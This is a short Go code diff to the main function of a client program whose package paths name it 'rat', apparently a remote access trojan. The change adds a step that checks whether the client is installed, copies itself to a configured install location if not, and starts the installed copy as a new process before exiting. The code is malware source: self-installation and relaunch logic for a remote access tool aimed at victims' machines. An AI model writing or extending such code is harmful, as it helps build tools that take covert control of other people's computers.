@@ -3,6 +3,8 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"os/exec"
+	"rat/client/install"
 	"rat/client/startup"
 	"rat/common"
 	"time"
@@ -12,6 +14,12 @@ func main() {
 	err := ParseConfig()
 	if err != nil {
 		fmt.Println(err.Error())
+		return
+	}
+
+	if !install.IsInstalled(Config.Install) {
+		file, _ := install.Install(Config.Name, Config.Install)
+		exec.Command(file).Start()
 		return
 	}
 
